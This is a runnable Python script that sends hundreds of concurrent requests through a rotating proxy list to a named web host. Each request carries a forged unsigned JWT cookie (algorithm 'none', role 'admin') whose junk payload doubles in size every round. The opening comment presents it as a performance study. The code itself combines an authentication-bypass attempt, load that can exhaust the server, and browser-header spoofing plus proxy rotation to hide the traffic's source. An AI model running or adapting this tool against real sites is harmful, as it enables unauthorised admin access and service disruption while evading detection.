# This Python script performs multiple HTTP requests through a list of proxies while dynamically varying 
# the size of a JWT (JSON Web Token) payload with each iteration. The script starts by loading proxy information 
# from a CSV file and uses a multithreading approach to send HTTP requests concurrently through these proxies.
# For each iteration, the JWT payload size is doubled, and a new JWT is generated and used for all requests in that iteration.
# The script collects and prints statistics such as success rates, response times, and HTTP status code distributions 
# to analyze the performance impact of increasing the JWT payload size on HTTP requests.
# Key steps of the script include:
# 1. Generating a JWT token with user details, role, expiration time, and a custom payload.
# 2. Loading proxy information from a CSV file.
# 3. Sending HTTP requests with the generated JWT token using proxies.
# 4. Executing multiple iterations with an increasing payload size.
# 5. Printing statistical data for each iteration to assess request performance.


import csv
import requests
import concurrent.futures
from urllib.parse import urlparse
import json
import random
import time
from statistics import mean, median, stdev
from datetime import datetime, timedelta
import base64

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36"
]

def generate_jwt_cookie(user, role, payload):
    """
    Generate a JWT token with 'none' algorithm, including user, role, exp, and payload.

    Args:
    user (str): Username or user ID.
    role (str): User role.
    payload (str): Additional free string payload.

    Returns:
    str: JWT token.
    """
    # Create the JWT header
    header = {"alg": "none", "typ": "JWT"}
    header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    
    # Create the JWT payload
    exp_time = datetime.utcnow() + timedelta(hours=1)
    payload_data = {"user": user, "role": role, "exp": int(exp_time.timestamp()), "payload": payload}

    # Print the JWT payload before encoding
    # print("JWT Payload (not encoded):", json.dumps(payload_data, indent=4))
    
    payload_encoded = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip("=")
    
    # Combine header and payload to form the JWT token
    jwt_token = f"{header_encoded}.{payload_encoded}."
    return jwt_token

def load_proxies(file_path):
    proxies = []
    with open(file_path, 'r') as f:
        reader = csv.reader(f)
        for row in reader:
            proxy = row[0]
            if proxy.startswith('socks4://'):
                proxy = 'socks4h://' + proxy[8:]
            elif proxy.startswith('socks5://'):
                proxy = 'socks5h://' + proxy[8:]
            proxies.append(proxy)
    return proxies

def send_request(proxy, jwt_token):
    parsed = urlparse(proxy)
    proxy_dict = {parsed.scheme: proxy}
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
    }
    
    try:
        session = requests.Session()
        session.headers.update(headers)
        session.cookies.set("jwt", jwt_token)  # Add JWT token as a cookie

        start_time = time.time()
        response = session.get('https://wts2024-well-protected.onrender.com/', proxies=proxy_dict, timeout=10)
        end_time = time.time()
        response_time = end_time - start_time
        return proxy, response_time, response.status_code
    except requests.RequestException:
        return proxy, None, None
    except Exception:
        return proxy, None, None

def run_iteration(proxies, num_threads, num_requests, jwt_token):
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_request, random.choice(proxies), jwt_token) for _ in range(num_requests)]
        for future in concurrent.futures.as_completed(futures):
            results.append(future.result())
    return results

def print_stats(iteration, num_threads, num_requests, results, payload_size):
    successful_requests = [result for result in results if result[1] is not None]
    
    print(f"\n--- Iteration {iteration} Statistics ---")
    print(f"Threads: {num_threads}, Requests: {num_requests}")
    print(f"Total Requests: {len(results)}")
    print(f"Successful Requests: {len(successful_requests)}")
    print(f"Failed Requests: {len(results) - len(successful_requests)}")
    
    if successful_requests:
        response_times = [result[1] for result in successful_requests]
        print(f"Payload size: {payload_size}")
        print(f"Maximum Response Time: {max(response_times):.2f}s")
        print(f"Average Response Time: {mean(response_times):.2f}s")
        print(f"Median Response Time: {median(response_times):.2f}s")
        print(f"Standard Deviation: {stdev(response_times):.2f}s")
        
        success_rate = (len(successful_requests) / len(results)) * 100
        print(f"Success Rate: {success_rate:.2f}%")
        
        response_codes = {}
        for _, _, status_code in results:
            if status_code:
                response_codes[status_code] = response_codes.get(status_code, 0) + 1
        
        print("Response Code Distribution:")
        for code, count in response_codes.items():
            print(f"Status {code}: {count} ({(count/len(results))*100:.2f}%)")
    else:
        print("No successful requests to analyze.")

def main():
    proxy_file = 'proxies.csv'
    proxies = load_proxies(proxy_file)
    
    base_threads = 10
    base_requests = 50
    initial_payload_size = 20

    for i in range(1, 11):
        num_threads = base_threads
        num_requests = base_requests

        # Double the size of the payload for each iteration
        payload_size = initial_payload_size * (2 ** (i - 1))
        payload = 'x' * payload_size

        # Generate JWT for the iteration
        jwt_token = generate_jwt_cookie("example_user", "admin", payload)

        # Run iteration with the generated JWT
        results = run_iteration(proxies, num_threads, num_requests, jwt_token)
        print_stats(i, num_threads, num_requests, results, payload_size)

if __name__ == '__main__':
    main()
